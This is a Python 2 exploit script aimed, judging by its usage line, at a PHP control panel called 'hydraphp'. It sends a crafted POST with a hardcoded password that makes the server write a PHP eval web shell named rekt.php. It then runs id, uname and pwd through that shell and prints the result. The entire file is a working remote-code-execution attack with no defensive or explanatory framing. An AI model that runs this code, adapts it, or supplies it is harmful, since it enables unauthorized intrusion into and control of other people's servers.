#!/usr/bin/python2
import requests
import sys

def drop_shell(target_url):
    print "{+} Dropping a shell on the target..."
    data = {"pw": "TaylorHak",
            "cmd": "Admin,WriteCMD,<?php eval($_REQUEST[1337]);",
            "hwid": "rekt.php",
            "username": "get",
            "country": "rekt",
            "os": "scrubs"}
    try:
        r = requests.post(target_url, data=data, verify=False)
    except Exception:
        sys.exit("NOPE!")
    lol = target_url.split("/")[-1]
    shell_url = target_url.replace(lol, "rekt.php")
    print "{+} Shell Uploaded. It should be at %s" %(shell_url)
    return shell_url

def check_shell(shell_url):
    print "{+} Sending id;uname -a;pwd...\n\n"
    data = {"1337": 'system("id;uname -a;pwd");'}
    try:
        r = requests.post(shell_url, data=data, verify=False)
        print r.content
    except Exception, e:
        sys.exit(str(e))

def main(args):
    if len(args) != 2:
        sys.exit("use: %s http://skidsr.us/hydraphp/index.php" %(args[0]))
    shell_url = drop_shell(target_url=args[1])
    check_shell(shell_url)

if __name__ == "__main__":
    main(args=sys.argv)
